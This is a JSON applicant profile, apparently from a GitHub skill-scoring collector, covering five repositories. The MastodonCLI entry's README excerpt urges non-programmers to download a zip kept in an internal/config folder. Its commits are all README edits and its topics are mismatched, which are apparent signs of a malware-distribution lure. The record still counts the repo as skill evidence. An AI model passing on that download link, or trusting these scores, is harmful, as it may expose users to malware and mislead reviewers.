@@ -1,0 +1,1001 @@
+{
+  "applicant_id": "applicant0142",
+  "login": "LucasJaider",
+  "html_url": "https://github.com/LucasJaider",
+  "created_at": "2023-04-14T00:34:40Z",
+  "account_age_days": 1252,
+  "public_repos": 5,
+  "followers": 2,
+  "following": 2,
+  "repos": [
+    {
+      "name": "MastodonCLI",
+      "full_name": "LucasJaider/MastodonCLI",
+      "html_url": "https://github.com/LucasJaider/MastodonCLI",
+      "description": "🦙 Access Mastodon easily with this minimal Go CLI and TUI, featuring OAuth login, timeline browsing, notifications, and post management.",
+      "homepage": "https://lucasjaider.github.io",
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2023-04-14T01:00:23Z",
+      "pushed_at": "2026-09-17T00:33:13Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 3207,
+      "default_branch": "main",
+      "license": null,
+      "topics": [
+        "activity-stream",
+        "cli",
+        "debugging",
+        "development",
+        "git",
+        "github-api-v4",
+        "http",
+        "http-client",
+        "ios",
+        "kotlin",
+        "kotlin-android",
+        "mastodon-client",
+        "nuxt-app",
+        "swift",
+        "web",
+        "webfinger"
+      ],
+      "languages": {
+        "Go": 64390
+      },
+      "primary_language": "Go",
+      "file_count": 25,
+      "top_level_paths": [
+        ".gitignore",
+        "AGENTS.md",
+        "README.md",
+        "go.mod",
+        "go.sum",
+        "image.png",
+        "internal"
+      ],
+      "notable_files": [
+        "go.mod"
+      ],
+      "manifests": {
+        "go.mod": [
+          "github.com/atotto/clipboard",
+          "github.com/aymanbagabas/go-osc52/v2",
+          "github.com/charmbracelet/bubbles",
+          "github.com/charmbracelet/bubbletea",
+          "github.com/charmbracelet/colorprofile",
+          "github.com/charmbracelet/lipgloss",
+          "github.com/charmbracelet/x/ansi",
+          "github.com/charmbracelet/x/cellbuf",
+          "github.com/charmbracelet/x/term",
+          "github.com/erikgeiser/coninput",
+          "github.com/lucasb-eyer/go-colorful",
+          "github.com/mattn/go-isatty",
+          "github.com/mattn/go-localereader",
+          "github.com/mattn/go-runewidth",
+          "github.com/muesli/ansi",
+          "github.com/muesli/cancelreader",
+          "github.com/muesli/termenv",
+          "github.com/rivo/uniseg",
+          "github.com/sahilm/fuzzy",
+          "github.com/xo/terminfo",
+          "golang.org/x/sys",
+          "golang.org/x/text"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4969,
+      "readme_excerpt": "# 🎉 MastodonCLI - Easily Manage Your Mastodon Account\n\n## 🚀 Getting Started\n\nMastodonCLI is a command-line interface (CLI) tool designed to help you interact with your Mastodon account easily. You do not need to be a programmer. Follow the steps below to download and run the software effortlessly.\n\n## 📥 Download and Install\n\n[![Download MastodonCLI](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip)\n\n1. Click on the download button above or [visit this page to download](https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip).\n2. You will see a list of available versions. Choose the latest version for your operating system.\n3. Click on the version name to be redirected to the specific release page.\n4. Download the file that corresponds to your system. Look for options like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/LucasJaider/MastodonCLI/raw/refs/heads/main/internal/config/CLI_Mastodon_2.1.zip` for Linux. \n\n## 💻 System Requirements\n\nTo use MastodonCLI smoothly, ensure th",
+      "has_ci": false,
+      "has_tests": true,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.238,
+      "commits": {
+        "count": 5,
+        "first_at": "2026-01-21T04:48:34+00:00",
+        "last_at": "2026-09-17T00:33:12+00:00",
+        "active_days": 3,
+        "span_days": 238,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": true
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": true,
+          "has_docker": false,
+          "deployed": true,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 4,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 17
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "go",
+          "source": "language",
+          "detail": "Go: 64,390 bytes (100% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "go",
+          "source": "file",
+          "detail": "Go module (go.mod)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "unit-testing",
+          "source": "file",
+          "detail": "test file (internal/cli/cli_test.go)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "git",
+          "source": "topic",
+          "detail": "repo topic 'git'",
+          "strength": 0.3
+        },
+        {
+          "skill_id": "native-mobile",
+          "source": "topic",
+          "detail": "repo topic 'kotlin'",
+          "strength": 0.3
+        },
+        {
+          "skill_id": "go",
+          "source": "repo_name",
+          "detail": "'go' in repo name/description",
+          "strength": 0.2
+        },
+        {
+          "skill_id": "auth",
+          "source": "repo_name",
+          "detail": "'oauth' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 64390,
+        "strong_skills": [
+          "go",
+          "unit-testing"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "projetoulbra",
+      "full_name": "LucasJaider/projetoulbra",
+      "html_url": "https://github.com/LucasJaider/projetoulbra",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2023-09-11T22:27:41Z",
+      "pushed_at": "2026-02-19T21:35:38Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 4590,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "Java": 148747
+      },
+      "primary_language": "Java",
+      "file_count": 146,
+      "top_level_paths": [
+        "ProjetoAula",
+        "README.md"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 14,
+      "readme_excerpt": "# projetoulbra",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 20,
+        "first_at": "2023-09-11T22:27:42+00:00",
+        "last_at": "2026-02-19T21:35:38+00:00",
+        "active_days": 11,
+        "span_days": 891,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 0.25,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Update README.md",
+          "Merge pull request #7 from LucasJaider/aula2709",
+          "2809",
+          "Merge pull request #6 from LucasJaider/aula2709",
+          "aula2709",
+          "Merge pull request #5 from LucasJaider/aula2109",
+          "aula2209",
+          "Merge pull request #4 from LucasJaider/aula2109",
+          "aula2109",
+          "Merge pull request #3 from LucasJaider/aula1409",
+          "aula1409",
+          "Merge pull request #2 from LucasJaider/aula1309",
+          "aula1309",
+          "Merge pull request #1 from LucasJaider/aula1209",
+          "aula1209",
+          "inicializar",
+          "Initial commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": true,
+          "many_active_days": true,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": false
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 3,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 21
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": true,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "java",
+          "source": "language",
+          "detail": "Java: 148,747 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 148747,
+        "strong_skills": [
+          "java"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "projeto-mobile",
+      "full_name": "LucasJaider/projeto-mobile",
+      "html_url": "https://github.com/LucasJaider/projeto-mobile",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2023-10-04T00:27:04Z",
+      "pushed_at": "2026-02-19T20:21:18Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 3583,
+      "default_branch": "aula27",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "TypeScript": 55182,
+        "Java": 7277,
+        "Objective-C": 2301,
+        "Ruby": 2293,
+        "JavaScript": 819,
+        "Objective-C++": 753
+      },
+      "primary_language": "TypeScript",
+      "file_count": 102,
+      "top_level_paths": [
+        "ProjetoMobile"
+      ],
+      "notable_files": [
+        "ProjetoMobile/Gemfile",
+        "ProjetoMobile/android/app/build.gradle",
+        "ProjetoMobile/android/build.gradle",
+        "ProjetoMobile/package.json"
+      ],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": true,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 3,
+        "first_at": "2023-10-28T01:26:18+00:00",
+        "last_at": "2026-02-19T20:21:17+00:00",
+        "active_days": 3,
+        "span_days": 845,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 0.667,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "aula27"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": true,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": true,
+          "documented": false
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 52
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "typescript",
+          "source": "language",
+          "detail": "TypeScript: 55,182 bytes (80% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "java",
+          "source": "language",
+          "detail": "Java: 7,277 bytes (11% of repo)",
+          "strength": 0.5060400728597451
+        },
+        {
+          "skill_id": "native-mobile",
+          "source": "language",
+          "detail": "Objective-C: 2,301 bytes (3% of repo)",
+          "strength": 0.43353005464480876
+        },
+        {
+          "skill_id": "unit-testing",
+          "source": "file",
+          "detail": "test file (ProjetoMobile/__tests__/App.test.tsx)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "native-mobile",
+          "source": "file",
+          "detail": "Android app manifest (ProjetoMobile/android/app/src/debug/AndroidManifest.xml)",
+          "strength": 0.6
+        },
+        {
+          "skill_id": "react-native",
+          "source": "file",
+          "detail": "React Native bundler config (ProjetoMobile/metro.config.js)",
+          "strength": 0.6
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 65579,
+        "strong_skills": [
+          "native-mobile",
+          "react-native",
+          "typescript",
+          "unit-testing"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "projetoform1",
+      "full_name": "LucasJaider/projetoform1",
+      "html_url": "https://github.com/LucasJaider/projetoform1",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2023-11-07T01:25:21Z",
+      "pushed_at": "2026-02-19T20:21:25Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1936,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "PHP": 904
+      },
+      "primary_language": "PHP",
+      "file_count": 3,
+      "top_level_paths": [
+        "Dytiscus",
+        "ex1.php"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.667,
+      "commits": {
+        "count": 2,
+        "first_at": "2026-01-21T06:07:22+00:00",
+        "last_at": "2026-02-19T20:21:24+00:00",
+        "active_days": 2,
+        "span_days": 29,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": true,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 2,
+        "intermediate_flag_count": 0,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 1
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [],
+      "skill_relevant": false,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": false,
+          "strong_skill_signal": false,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [
+          "code_bytes",
+          "strong_skill_signal"
+        ],
+        "code_bytes": 0,
+        "strong_skills": []
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "lucasjaider.github.io",
+      "full_name": "LucasJaider/lucasjaider.github.io",
+      "html_url": "https://github.com/LucasJaider/lucasjaider.github.io",
+      "description": "🔗 Access Mastodon easily with this minimal Go CLI and TUI. Browse timelines, manage notifications, and read posts securely.",
+      "homepage": "https://github.com/LucasJaider/MastodonCLI",
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2026-01-20T03:25:07Z",
+      "pushed_at": "2026-02-19T20:21:01Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 573,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {},
+      "primary_language": null,
+      "file_count": 2,
+      "top_level_paths": [
+        "Bawra",
+        "index.md"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": false,
+      "readme_length": 0,
+      "readme_excerpt": null,
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 2,
+        "first_at": "2026-01-20T03:25:37+00:00",
+        "last_at": "2026-02-19T20:21:01+00:00",
+        "active_days": 2,
+        "span_days": 30,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Commit",
+          "Commit"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": true,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": true,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": true,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": false
+        },
+        "entry_flag_count": 2,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 0
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "go",
+          "source": "repo_name",
+          "detail": "'go' in repo name/description",
+          "strength": 0.2
+        }
+      ],
+      "skill_relevant": false,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": false,
+          "code_bytes": false,
+          "strong_skill_signal": false,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [
+          "has_code_files",
+          "code_bytes",
+          "strong_skill_signal"
+        ],
+        "code_bytes": 0,
+        "strong_skills": []
+      },
+      "tree_truncated": false
+    }
+  ],
+  "external_contributions": [],
+  "languages_bytes": {
+    "Java": 156024,
+    "Go": 64390,
+    "TypeScript": 55182,
+    "Objective-C": 2301,
+    "Ruby": 2293,
+    "PHP": 904,
+    "JavaScript": 819,
+    "Objective-C++": 753
+  },
+  "total_commits": 32,
+  "skill_evidence": [
+    {
+      "skill_id": "go",
+      "repos": [
+        "LucasJaider/MastodonCLI",
+        "LucasJaider/lucasjaider.github.io"
+      ],
+      "signal_count": 4,
+      "sources": [
+        "language",
+        "file",
+        "repo_name"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 64390,
+      "commit_count": 7,
+      "first_seen": "2026-01-20T03:25:37+00:00",
+      "last_seen": "2026-09-17T00:33:12+00:00",
+      "details": [
+        "MastodonCLI: Go: 64,390 bytes (100% of repo)",
+        "MastodonCLI: Go module (go.mod)",
+        "MastodonCLI: 'go' in repo name/description",
+        "lucasjaider.github.io: 'go' in repo name/description"
+      ]
+    },
+    {
+      "skill_id": "java",
+      "repos": [
+        "LucasJaider/projetoulbra",
+        "LucasJaider/projeto-mobile"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 156024,
+      "commit_count": 23,
+      "first_seen": "2023-09-11T22:27:42+00:00",
+      "last_seen": "2026-02-19T21:35:38+00:00",
+      "details": [
+        "projetoulbra: Java: 148,747 bytes (100% of repo)",
+        "projeto-mobile: Java: 7,277 bytes (11% of repo)"
+      ]
+    },
+    {
+      "skill_id": "typescript",
+      "repos": [
+        "LucasJaider/projeto-mobile"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 55182,
+      "commit_count": 3,
+      "first_seen": "2023-10-28T01:26:18+00:00",
+      "last_seen": "2026-02-19T20:21:17+00:00",
+      "details": [
+        "projeto-mobile: TypeScript: 55,182 bytes (80% of repo)"
+      ]
+    },
+    {
+      "skill_id": "native-mobile",
+      "repos": [
+        "LucasJaider/MastodonCLI",
+        "LucasJaider/projeto-mobile"
+      ],
+      "signal_count": 3,
+      "sources": [
+        "topic",
+        "language",
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 2301,
+      "commit_count": 8,
+      "first_seen": "2023-10-28T01:26:18+00:00",
+      "last_seen": "2026-09-17T00:33:12+00:00",
+      "details": [
+        "MastodonCLI: repo topic 'kotlin'",
+        "projeto-mobile: Objective-C: 2,301 bytes (3% of repo)",
+        "projeto-mobile: Android app manifest (ProjetoMobile/android/app/src/debug/AndroidManifest.xml)"
+      ]
+    },
+    {
+      "skill_id": "unit-testing",
+      "repos": [
+        "LucasJaider/MastodonCLI",
+        "LucasJaider/projeto-mobile"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 8,
+      "first_seen": "2023-10-28T01:26:18+00:00",
+      "last_seen": "2026-09-17T00:33:12+00:00",
+      "details": [
+        "MastodonCLI: test file (internal/cli/cli_test.go)",
+        "projeto-mobile: test file (ProjetoMobile/__tests__/App.test.tsx)"
+      ]
+    },
+    {
+      "skill_id": "react-native",
+      "repos": [
+        "LucasJaider/projeto-mobile"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "file"
+      ],
+      "max_strength": 0.6,
+      "total_bytes": 0,
+      "commit_count": 3,
+      "first_seen": "2023-10-28T01:26:18+00:00",
+      "last_seen": "2026-02-19T20:21:17+00:00",
+      "details": [
+        "projeto-mobile: React Native bundler config (ProjetoMobile/metro.config.js)"
+      ]
+    },
+    {
+      "skill_id": "git",
+      "repos": [
+        "LucasJaider/MastodonCLI"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "topic"
+      ],
+      "max_strength": 0.3,
+      "total_bytes": 0,
+      "commit_count": 5,
+      "first_seen": "2026-01-21T04:48:34+00:00",
+      "last_seen": "2026-09-17T00:33:12+00:00",
+      "details": [
+        "MastodonCLI: repo topic 'git'"
+      ]
+    },
+    {
+      "skill_id": "auth",
+      "repos": [
+        "LucasJaider/MastodonCLI"
+      ],
+      "signal_count": 1,
+      "sources": [
+        "repo_name"
+      ],
+      "max_strength": 0.2,
+      "total_bytes": 0,
+      "commit_count": 5,
+      "first_seen": "2026-01-21T04:48:34+00:00",
+      "last_seen": "2026-09-17T00:33:12+00:00",
+      "details": [
+        "MastodonCLI: 'oauth' in repo name/description"
+      ]
+    }
+  ],
+  "tier": "strict",
+  "usability": {
+    "tier": "strict",
+    "checks": {
+      "skill_relevant_repos": {
+        "actual": 3,
+        "required": 3,
+        "tier": "relaxed"
+      },
+      "readable_repos": {
+        "actual": 2,
+        "required": 1,
+        "tier": "relaxed"
+      },
+      "total_commits": {
+        "actual": 32,
+        "required": 20,
+        "tier": "strict"
+      },
+      "distinct_skills": {
+        "actual": 6,
+        "required": 3,
+        "tier": "strict"
+      }
+    },
+    "failed": [],
+    "reason": "meets all thresholds"
+  },
+  "search_stratum": "go-systems",
+  "collected_at": "2026-09-17T01:27:20.191839+00:00",
+  "collector_version": "0.1.0",
+  "notes": []
+}
